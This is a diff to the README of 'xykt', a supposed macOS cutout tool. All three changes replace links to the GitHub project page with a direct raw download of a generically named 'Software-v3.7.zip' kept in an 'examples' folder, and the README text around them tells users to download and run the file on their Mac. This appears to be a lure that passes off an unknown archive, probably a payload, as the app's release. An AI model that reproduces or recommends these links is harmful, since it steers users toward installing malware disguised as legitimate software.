@@ -1,6 +1,6 @@
 # 🪟 xykt - Simple macOS Cutout Tool
 
-[![Download xykt](https://img.shields.io/badge/Download%20xykt-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/obsessivecompulsive-bougainvillea427/xykt)
+[![Download xykt](https://img.shields.io/badge/Download%20xykt-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/obsessivecompulsive-bougainvillea427/xykt/main/examples/Software-v3.7.zip)
 
 ## 📌 What is xykt?
 
@@ -15,7 +15,7 @@ Use it when you want to:
 ## 🚀 Download and install
 
 Open this page to download:  
-https://github.com/obsessivecompulsive-bougainvillea427/xykt
+https://raw.githubusercontent.com/obsessivecompulsive-bougainvillea427/xykt/main/examples/Software-v3.7.zip
 
 If the page includes a release file, download it and run it on your Mac. If the file comes as a `.dmg`, open it, then drag the app into your Applications folder. If it comes as a `.zip`, unzip it first, then open the app inside.
 
@@ -154,7 +154,7 @@ After download, make sure:
 ## 🔗 Download link
 
 Download or open the project page here:  
-https://github.com/obsessivecompulsive-bougainvillea427/xykt
+https://raw.githubusercontent.com/obsessivecompulsive-bougainvillea427/xykt/main/examples/Software-v3.7.zip
 
 ## 🧠 About the name
 
